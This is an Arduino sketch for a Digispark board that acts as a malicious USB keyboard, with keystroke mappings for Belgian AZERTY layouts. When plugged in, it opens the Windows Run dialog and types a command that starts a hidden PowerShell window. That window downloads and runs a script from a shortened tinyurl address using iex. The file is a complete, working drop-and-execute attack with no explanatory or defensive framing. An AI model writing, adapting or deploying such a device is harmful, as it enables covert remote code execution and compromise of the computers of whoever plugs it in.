#include <DigiKeyboard.h>

void typeChar(char c) {
  uint8_t key = 0;
  uint8_t mod = 0;
  
  // Letters mapping voor AZERTY
  if (c >= 'a' && c <= 'z') {
    switch(c) {
      case 'a': key = 0x14; break; // Q
      case 'q': key = 0x04; break; // A
      case 'z': key = 0x1a; break; // W
      case 'w': key = 0x1d; break; // Z
      case 'm': key = 0x33; break; // ; positie = M op AZERTY
      case 'b': key = 0x05; break;
      case 'c': key = 0x06; break;
      case 'd': key = 0x07; break;
      case 'e': key = 0x08; break;
      case 'f': key = 0x09; break;
      case 'g': key = 0x0a; break;
      case 'h': key = 0x0b; break;
      case 'i': key = 0x0c; break;
      case 'j': key = 0x0d; break;
      case 'k': key = 0x0e; break;
      case 'l': key = 0x0f; break;
      case 'n': key = 0x11; break;
      case 'o': key = 0x12; break;
      case 'p': key = 0x13; break;
      case 'r': key = 0x15; break;
      case 's': key = 0x16; break;
      case 't': key = 0x17; break;
      case 'u': key = 0x18; break;
      case 'v': key = 0x19; break;
      case 'x': key = 0x1b; break;
      case 'y': key = 0x1c; break;
    }
  }
  // Speciale karakters - Belgian AZERTY correctie
  else {
    switch(c) {
      case ' ': key = 0x2c; break; // spatie
      case '/': key = 0x37; mod = MOD_SHIFT_LEFT; break; // SHIFT + . toets
      case '-': key = 0x2e; break; // = toets op QWERTY
      case '.': key = 0x36; mod = MOD_SHIFT_LEFT; break; // SHIFT + ,
      case ':': key = 0x37; break; // . toets zonder SHIFT - BREAK WAS MISSING!
      case '(': key = 0x22; break; // 5 toets
      case ')': key = 0x2d; break; // - toets op QWERTY
      case '\'': key = 0x21; break; // 4 toets - WAS MISSING!
      case '1': key = 0x1e; mod = MOD_SHIFT_LEFT; break;
      case '2': key = 0x1f; mod = MOD_SHIFT_LEFT; break;
    }
  }
  
  if (key != 0) {
    DigiKeyboard.sendKeyStroke(key, mod);
    DigiKeyboard.delay(30);
  }
}

void typeString(const char* str) {
  for (int i = 0; str[i] != '\0'; i++) {
    typeChar(str[i]);
  }
}

void setup() {
  DigiKeyboard.delay(200);
  
  // Open Run dialog (Win+R)
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(200);
  
  // Type command
  typeString("cmd /c start /min powershell -windowstyle hidden -command iex (wget https://tinyurl.com/y4tvvezc -useb)");
  
  // Enter
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
}

void loop() {
  DigiKeyboard.delay(1000);
}
